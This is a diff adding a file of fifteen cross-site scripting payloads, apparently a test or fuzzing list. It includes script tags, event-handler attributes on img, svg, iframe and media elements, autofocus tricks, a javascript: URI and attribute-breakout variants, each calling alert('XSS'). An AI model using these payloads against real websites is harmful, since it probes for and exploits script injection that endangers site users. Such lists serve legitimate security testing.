@@ -1,0 +1,15 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe onload=alert('XSS')></iframe>
+javascript:alert('XSS')
+<input autofocus onfocus=alert('XSS')>
+<select autofocus onfocus=alert('XSS')>
+<textarea autofocus onfocus=alert('XSS')>
+<keygen autofocus onfocus=alert('XSS')>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+><img src=x onerror=alert('XSS')> 
